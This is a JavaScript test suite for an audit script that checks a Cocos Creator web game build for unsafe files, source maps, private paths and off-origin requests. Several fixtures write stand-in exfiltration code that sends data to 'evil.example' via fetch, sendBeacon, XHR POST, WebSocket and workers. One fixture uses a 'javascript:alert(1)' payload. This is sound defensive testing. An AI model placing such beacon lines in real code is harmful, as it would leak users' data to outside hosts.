import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import test, { after } from 'node:test';

import {
  auditWebBuild,
  contentTypeForWebPath,
  extractStaticWebReferences,
} from '../scripts/audit-web-build.mjs';

const testRoot = mkdtempSync(join(tmpdir(), 'pencil-blade-web-audit-'));
const projectRoot = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const auditScript = join(projectRoot, 'scripts/audit-web-build.mjs');
let fixtureIndex = 0;

after(() => {
  rmSync(testRoot, { force: true, recursive: true });
});

test('Creator 3.8.8 Web Mobile Pages config is explicit, production-only, and sanitized', () => {
  const configPath = join(projectRoot, 'game/build-configs/web-mobile-pages.json');
  const source = readFileSync(configPath, 'utf8');
  const config = JSON.parse(source);
  const sceneUuid = '35e5417d-c3dd-4522-9339-99c81a0b9b4b';

  assert.equal(config.platform, 'web-mobile');
  assert.equal(config.buildPath, 'project://build');
  assert.equal(config.outputName, 'web-mobile-pages');
  assert.equal(config.taskName, 'web-mobile-pages');
  assert.equal(config.startScene, sceneUuid);
  assert.deepEqual(config.scenes, [{
    url: 'db://assets/scenes/classic.scene',
    uuid: sceneUuid,
  }]);
  assert.deepEqual(config.designResolution, {
    fitHeight: true,
    fitWidth: true,
    height: 1280,
    width: 720,
  });
  assert.equal(config.debug, false);
  assert.equal(config.sourceMaps, false);
  assert.equal(config.mainBundleIsRemote, false);
  assert.equal(config.server, '');
  assert.equal(config.packages['web-mobile'].orientation, 'portrait');
  assert.equal(config.packages['web-mobile'].embedWebDebugger, false);
  assert.doesNotMatch(source, /(?:\/Users\/|\/home\/|[A-Za-z]:\\Users\\|https?:\/\/|token|password|keystore)/iu);
});

test('clean Creator-shaped directory passes with comments containing documentation URLs', () => {
  const buildRoot = createValidBuild();

  assert.deepEqual(auditWebBuild(buildRoot), []);
});

test('actual Creator diagnostics, the SystemJS import pseudo-scheme, and logical resource keys are not network URLs', () => {
  const buildRoot = createValidBuild();
  writeBuildFile(
    buildRoot,
    'src/system.bundle.js',
    [
      'System.import("import:");',
      'const diagnostic = "https://git.io/JvFET#3";',
    ].join('\n'),
  );
  writeBuildFile(
    buildRoot,
    'assets/main/index.js',
    [
      'const docs = "https://github.com/cocos/cocos-engine/blob/" + version + "/EngineErrorMap.md";',
      'const logicalResource = profile + "/Blades/Particles/X-Mas/xmashexa.png";',
    ].join('\n'),
  );

  assert.deepEqual(auditWebBuild(buildRoot), []);
});

test('audit accepts only one real directory root', () => {
  const missingRoot = join(testRoot, 'missing');
  const fileRoot = join(testRoot, 'file-root');
  writeFileSync(fileRoot, 'not a directory');
  const validRoot = createValidBuild();
  const linkedRoot = join(testRoot, 'linked-root');
  symlinkSync(validRoot, linkedRoot, 'dir');

  assert.throws(() => auditWebBuild(), /must name one directory/u);
  assert.throws(() => auditWebBuild(missingRoot), /does not exist/u);
  assert.throws(() => auditWebBuild(fileRoot), /must be a real directory/u);
  assert.throws(() => auditWebBuild(linkedRoot), /must be a real directory/u);
});

test('nested symlinks, encoded traversal names, and unsafe filesystem types fail closed', () => {
  const buildRoot = createValidBuild();
  const outside = join(testRoot, 'outside.js');
  writeFileSync(outside, 'export const escaped = true;');
  symlinkSync(outside, join(buildRoot, 'assets/game/linked.js'));
  writeBuildFile(buildRoot, '%2e%2e/hidden.js', 'export const hidden = true;');
  const fifoPath = join(buildRoot, 'assets/game/stream.bin');
  const mkfifo = spawnSync('mkfifo', [fifoPath], { encoding: 'utf8' });
  assert.equal(mkfifo.status, 0, mkfifo.stderr);

  const reasons = auditWebBuild(buildRoot).map((item) => item.reason);
  assert.ok(reasons.includes('symbolic links are prohibited in a web build'));
  assert.ok(reasons.includes('unsafe or path-escaping web build entry'));
  assert.ok(reasons.includes('unsafe non-file filesystem entry'));
});

test('application archives, native libraries, renamed executable bytes, and unsafe extensions fail', () => {
  const buildRoot = createValidBuild();
  writeBuildFile(buildRoot, 'payload.apk', Buffer.from([0x50, 0x4b, 0x03, 0x04]));
  writeBuildFile(buildRoot, 'lib/legacy.so', Buffer.from([0x7f, 0x45, 0x4c, 0x46]));
  writeBuildFile(buildRoot, 'assets/game/renamed.bin', Buffer.from([0x7f, 0x45, 0x4c, 0x46]));
  writeBuildFile(buildRoot, 'assets/game/archive.bin', Buffer.from([0x50, 0x4b, 0x03, 0x04]));
  writeBuildFile(buildRoot, 'assets/game/installer.bin', Buffer.from([0x4d, 0x5a, 0x00, 0x00]));
  writeBuildFile(buildRoot, 'assets/game/handler.php', '<?php echo "no";');

  const reasons = auditWebBuild(buildRoot).map((item) => item.reason);
  assert.ok(reasons.includes('native, application, or executable payload type is prohibited'));
  assert.ok(reasons.includes('ZIP or embedded application archive payload is prohibited'));
  assert.ok(reasons.includes('ELF or native shared-library payload is prohibited'));
  assert.ok(reasons.includes('unexpected executable binary payload is prohibited'));
  assert.ok(reasons.includes('unsupported static file type'));
});

test('legacy runtime and private evidence paths or references fail closed', () => {
  const buildRoot = createValidBuild();
  writeBuildFile(
    buildRoot,
    'assets/game/legacy.js',
    'nativeSetApkPath(); const engine = "cocos2d-x 2.1.4"; const bridge = "native compatibility bridge";',
  );
  writeBuildFile(buildRoot, 'evidence/notes.txt', 'JADX decompiler output');

  const reasons = auditWebBuild(buildRoot).map((item) => item.reason);
  assert.ok(reasons.includes('legacy native loading or bridge reference'));
  assert.ok(reasons.includes('legacy Cocos2d-x 2.1.4 runtime reference'));
  assert.ok(reasons.includes('native compatibility or emulation reference'));
  assert.ok(reasons.includes('private evidence or development-only path is prohibited'));
  assert.ok(reasons.includes('decompiler or reverse-engineering dependency'));
});

test('source-map files, directives, and renamed source-map JSON fail closed', () => {
  const buildRoot = createValidBuild();
  writeBuildFile(buildRoot, 'application.js.map', '{"version":3,"sources":[],"mappings":""}');
  writeBuildFile(
    buildRoot,
    'application.js',
    'export class Application {} //# sourceMappingURL=application.js.map',
  );
  writeBuildFile(
    buildRoot,
    'assets/game/debug.json',
    JSON.stringify({ mappings: '', sources: ['/private/source.ts'], version: 3 }),
  );

  const reasons = auditWebBuild(buildRoot).map((item) => item.reason);
  assert.ok(reasons.includes('source-map files are prohibited'));
  assert.ok(reasons.includes('source-map reference is prohibited'));
  assert.ok(reasons.includes('source-map JSON payload is prohibited'));
});

test('private absolute paths, off-origin URLs, root URLs, and escaping URLs fail closed', () => {
  const buildRoot = createValidBuild();
  writeBuildFile(
    buildRoot,
    'src/leak.js',
    [
      'const source = "/Users/alice/private/game.ts";',
      'fetch("https://cdn.example.invalid/remote.png");',
      'new WebSocket("wss://socket.example.invalid/game");',
      'navigator.sendBeacon("https://telemetry.example.invalid/collect");',
      'location.assign("https://redirect.example.invalid/");',
      'fetch("/assets/root.png");',
      'import("../../outside.js");',
      'const settingsPath = "../outside.json";',
    ].join('\n'),
  );

  const reasons = auditWebBuild(buildRoot).map((item) => item.reason);
  assert.ok(reasons.includes('private machine-local absolute path is prohibited'));
  assert.ok(reasons.some((reason) => reason.startsWith('off-origin URL is prohibited')));
  assert.ok(reasons.some((reason) => reason.includes('wss://socket.example.invalid/game')));
  assert.ok(reasons.some((reason) => reason.includes('https://telemetry.example.invalid/collect')));
  assert.ok(reasons.some((reason) => reason.includes('https://redirect.example.invalid/')));
  assert.ok(reasons.some((reason) => reason.startsWith('root-relative URL bypasses the Pages prefix')));
  assert.ok(reasons.some((reason) => reason.startsWith('URL escapes the web build root')));
});

test('indirect network and navigation sink values are resolved without executing JavaScript', () => {
  const reviewerSource =
    'const endpoint = "https://evil.example/collect"; fetch(endpoint);';
  assert.deepEqual(
    extractStaticWebReferences('assets/game/index.js', reviewerSource)
      .map((reference) => reference.value),
    ['https://evil.example/collect'],
  );
  assert.deepEqual(
    extractStaticWebReferences(
      'assets/game/index.js',
      'const endpoint = "https://evil.example/asi"\nfetch(endpoint)',
    ).map((reference) => reference.value),
    ['https://evil.example/asi'],
  );
  assert.deepEqual(
    extractStaticWebReferences(
      'assets/game/index.js',
      [
        'const endpoint = "https://evil.example/outer";',
        'for (const endpoint of []) {}',
        'fetch(endpoint);',
      ].join('\n'),
    ).map((reference) => reference.value),
    ['https://evil.example/outer'],
  );
  assert.deepEqual(
    extractStaticWebReferences(
      'assets/game/index.js',
      [
        'const endpoint = "https://evil.example/unbraced";',
        'for (const endpoint of []) void endpoint',
        'fetch(endpoint)',
      ].join('\n'),
    ).map((reference) => reference.value),
    ['https://evil.example/unbraced'],
  );

  const buildRoot = createValidBuild();
  writeBuildFile(
    buildRoot,
    'src/indirect-unsafe.js',
    [
      'const origin = "https://evil.example";',
      'const collect = origin + "/collect";',
      'const endpoint = collect;',
      'const asiEndpoint = "https://evil.example/asi"',
      'fetch(asiEndpoint)',
      'const outerEndpoint = "https://evil.example/outer";',
      'for (const outerEndpoint of []) {}',
      'fetch(outerEndpoint);',
      'const unbracedEndpoint = "https://evil.example/unbraced";',
      'for (const unbracedEndpoint of []) void unbracedEndpoint',
      'fetch(unbracedEndpoint)',
      'const routes = {',
      '  collect: endpoint,',
      '  events: `${origin}/events`,',
      '  socket: "wss://" + "socket.example/game",',
      '  script: "//evil.example/worker.js",',
      '  unsafe: "javascript:alert(1)",',
      '};',
      'fetch(endpoint);',
      'new Request(routes.collect);',
      'const xhr = new XMLHttpRequest();',
      'xhr.open("POST", routes.collect);',
      'new WebSocket(routes.socket);',
      'new EventSource(routes.events);',
      'navigator.sendBeacon(routes.collect);',
      'new Worker(routes.script);',
      'new SharedWorker(routes.script);',
      'importScripts(routes.script);',
      'import(routes.script);',
      'location.assign(routes.collect);',
      'window.location.href = routes.unsafe;',
    ].join('\n'),
  );

  const reasons = auditWebBuild(buildRoot).map((item) => item.reason);
  assert.ok(reasons.some((reason) => reason.includes('https://evil.example/collect')));
  assert.ok(reasons.some((reason) => reason.includes('https://evil.example/asi')));
  assert.ok(reasons.some((reason) => reason.includes('https://evil.example/outer')));
  assert.ok(reasons.some((reason) => reason.includes('https://evil.example/unbraced')));
  assert.ok(reasons.some((reason) => reason.includes('https://evil.example/events')));
  assert.ok(reasons.some((reason) => reason.includes('wss://socket.example/game')));
  assert.ok(reasons.some((reason) => reason.includes('//evil.example/worker.js')));
  assert.ok(reasons.some((reason) => reason.includes('javascript:alert(1)')));
});

test('indirect relative sink values and unrelated documentation strings remain allowed', () => {
  const buildRoot = createValidBuild();
  writeBuildFile(
    buildRoot,
    'aliases.js',
    [
      'const documentation = "https://docs.example.invalid/networking";',
      'const prefix = "./assets/game";',
      'const paths = { audio: `${prefix}/audio/` + "cut.ogg", worker: "./src/lazy.js" };',
      'const endpoint = paths.audio;',
      'for (const documentation = paths.audio; false;)',
      '  if (false) void 0; else fetch(documentation);',
      'fetch(endpoint);',
      'new Request(endpoint);',
      'const xhr = new XMLHttpRequest();',
      'xhr.open("GET", endpoint);',
      'new WebSocket(endpoint);',
      'new EventSource(endpoint);',
      'navigator.sendBeacon(endpoint);',
      'new Worker(paths.worker);',
      'new SharedWorker(paths.worker);',
      'importScripts(paths.worker);',
      'import(paths.worker);',
      'location.assign("./index.html");',
      'window.open("./index.html");',
      'void documentation;',
    ].join('\n'),
  );

  assert.deepEqual(auditWebBuild(buildRoot), []);
});

test('file count, individual file size, and total size are bounded', () => {
  const buildRoot = createValidBuild();

  assert.throws(
    () => auditWebBuild(buildRoot, { limits: { maxFiles: 1 } }),
    /file count exceeds 1/u,
  );
  assert.throws(
    () => auditWebBuild(buildRoot, { limits: { maxFileBytes: 8 } }),
    /8-byte file limit/u,
  );
  assert.throws(
    () => auditWebBuild(buildRoot, { limits: { maxTotalBytes: 16 } }),
    /content exceeds 16 bytes/u,
  );
  assert.throws(
    () => auditWebBuild(buildRoot, { limits: { maxFiles: Number.MAX_SAFE_INTEGER } }),
    /no greater than/u,
  );
});

test('index and essential Cocos engine, launcher, settings, and game bundle payloads are mandatory', () => {
  const buildRoot = createValidBuild();
  rmSync(join(buildRoot, 'index.html'));
  rmSync(join(buildRoot, 'index.js'));
  rmSync(join(buildRoot, 'application.js'));
  rmSync(join(buildRoot, 'src/settings.json'));
  rmSync(join(buildRoot, 'cocos-js/cc.js'));
  rmSync(join(buildRoot, 'src/chunks/bundle.js'));
  rmSync(join(buildRoot, 'assets/game/config.json'));
  rmSync(join(buildRoot, 'assets/game/index.js'));

  const reasons = auditWebBuild(buildRoot).map((item) => item.reason);
  assert.ok(reasons.includes('required root index.html is missing'));
  assert.ok(reasons.includes('required Cocos bootstrap script is missing'));
  assert.ok(reasons.includes('required Cocos application launcher is missing'));
  assert.ok(reasons.includes('required Cocos settings payload is missing'));
  assert.ok(reasons.includes('required Cocos engine JavaScript payload is missing'));
  assert.ok(reasons.includes('required Creator Box2D JavaScript payload is missing'));
  assert.ok(reasons.includes('required game Asset Bundle configuration is missing'));
  assert.ok(reasons.includes('required game Asset Bundle script is missing'));
});

test('malformed JSON and non-UTF-8 text fail closed', () => {
  const buildRoot = createValidBuild();
  writeBuildFile(buildRoot, 'assets/game/bad.json', '{');
  writeBuildFile(buildRoot, 'assets/game/bad.txt', Buffer.from([0xc3, 0x28]));

  const reasons = auditWebBuild(buildRoot).map((item) => item.reason);
  assert.ok(reasons.includes('JSON payload is malformed'));
  assert.ok(reasons.includes('text payload is not valid UTF-8'));
});

test('MIME table covers scripts, WebAssembly, fonts, images, audio, and video', () => {
  assert.equal(contentTypeForWebPath('index.html'), 'text/html; charset=utf-8');
  assert.equal(contentTypeForWebPath('index.js'), 'text/javascript; charset=utf-8');
  assert.equal(contentTypeForWebPath('engine.wasm'), 'application/wasm');
  assert.equal(contentTypeForWebPath('font.woff2'), 'font/woff2');
  assert.equal(contentTypeForWebPath('texture.png'), 'image/png');
  assert.equal(contentTypeForWebPath('cue.ogg'), 'audio/ogg');
  assert.equal(contentTypeForWebPath('clip.mp4'), 'video/mp4');
  assert.equal(contentTypeForWebPath('payload.php'), undefined);
});

test('audit CLI succeeds only for an audited directory', () => {
  const buildRoot = createValidBuild();
  const success = spawnSync(process.execPath, [auditScript, buildRoot], { encoding: 'utf8' });
  assert.equal(success.status, 0, success.stderr);
  assert.match(success.stdout, /^PASS:/u);

  const failure = spawnSync(process.execPath, [auditScript, join(buildRoot, 'index.html')], {
    encoding: 'utf8',
  });
  assert.equal(failure.status, 2);
  assert.match(failure.stderr, /^ERROR:/u);
});

function createValidBuild() {
  fixtureIndex += 1;
  const buildRoot = join(testRoot, `build-${fixtureIndex}`);
  writeBuildFile(
    buildRoot,
    'index.html',
    [
      '<!doctype html>',
      '<!-- https://documentation.example.invalid must not be treated as a request -->',
      '<link rel="stylesheet" href="./style.css">',
      '<canvas id="GameCanvas"></canvas>',
      '<script type="module" src="./index.js"></script>',
    ].join('\n'),
  );
  writeBuildFile(
    buildRoot,
    'style.css',
    [
      '/* https://documentation.example.invalid is only a comment */',
      '@font-face { font-family: Linds; src: url("./assets/game/fonts/linds.woff2"); }',
      'body { background-image: url("./assets/game/native/loading%20screen.png"); }',
    ].join('\n'),
  );
  writeBuildFile(
    buildRoot,
    'index.js',
    [
      'System.register(["./application.js", "./src/lazy.js"], function () {',
      '  return { setters: [function () {}, function () {}], execute: function () {} };',
      '});',
    ].join('\n'),
  );
  writeBuildFile(
    buildRoot,
    'application.js',
    [
      'System.register([], function () {',
      '  const settingsPath = "src/settings.json";',
      '  return { setters: [], execute: function () { return settingsPath; } };',
      '});',
    ].join('\n'),
  );
  writeBuildFile(
    buildRoot,
    'src/lazy.js',
    'fetch("assets/game/audio/cut.ogg");',
  );
  writeBuildFile(
    buildRoot,
    'src/settings.json',
    JSON.stringify({
      assets: {
        lazyAssetUrl: 'assets/game/native/loading%20screen.png',
      },
      debug: false,
      launchScene: 'db://assets/scenes/classic.scene',
      scripting: {
        scriptPackages: ['../src/chunks/bundle.js'],
      },
    }),
  );
  writeBuildFile(
    buildRoot,
    'src/import-map.json',
    JSON.stringify({ imports: { cc: '../cocos-js/cc.js' } }),
  );
  writeBuildFile(
    buildRoot,
    'src/chunks/bundle.js',
    'System.register("chunks:///_virtual/box2d.umd.js", [], function () { const b2World = {}; });',
  );
  writeBuildFile(
    buildRoot,
    'cocos-js/cc.js',
    'System.register(["./meshopt_decoder.wasm-wrapper.js"], function () { return {}; });',
  );
  writeBuildFile(
    buildRoot,
    'cocos-js/meshopt_decoder.wasm-wrapper.js',
    'System.register([], function (_export) { _export("default", "assets/meshopt_decoder.wasm.wasm"); });',
  );
  writeBuildFile(
    buildRoot,
    'cocos-js/assets/meshopt_decoder.wasm.wasm',
    Buffer.from([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]),
  );
  writeBuildFile(buildRoot, 'assets/game/config.json', JSON.stringify({ name: 'game' }));
  writeBuildFile(buildRoot, 'assets/game/index.js', 'export const bundle = "game";');
  writeBuildFile(buildRoot, 'assets/game/fonts/linds.woff2', Buffer.from('wOF2font'));
  writeBuildFile(buildRoot, 'assets/game/native/loading screen.png', Buffer.from('PNGfixture'));
  writeBuildFile(buildRoot, 'assets/game/audio/cut.ogg', Buffer.from('OggSfixture'));
  return buildRoot;
}

function writeBuildFile(buildRoot, relativePath, contents) {
  const absolutePath = join(buildRoot, relativePath);
  mkdirSync(dirname(absolutePath), { recursive: true });
  writeFileSync(absolutePath, contents);
}
